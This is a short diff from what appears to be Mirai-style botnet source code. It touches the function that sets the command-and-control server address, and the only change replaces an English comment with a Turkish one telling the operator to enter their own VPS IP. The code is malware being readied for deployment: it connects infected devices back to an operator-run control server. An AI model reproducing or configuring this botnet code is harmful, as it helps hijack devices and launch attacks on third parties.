@@ -362,7 +362,7 @@ static void resolve_cnc_addr(void)
 {
     table_unlock_val(TABLE_CNC_PORT);
 
-    srv_addr.sin_addr.s_addr = INET_ADDR(0,0,0,0); // Change this to your server IP
+    srv_addr.sin_addr.s_addr = INET_ADDR(0,0,0,0); // Buraya Kendi VPS Ip ni yazacan Virgül İle
     srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
 
     table_lock_val(TABLE_CNC_PORT);
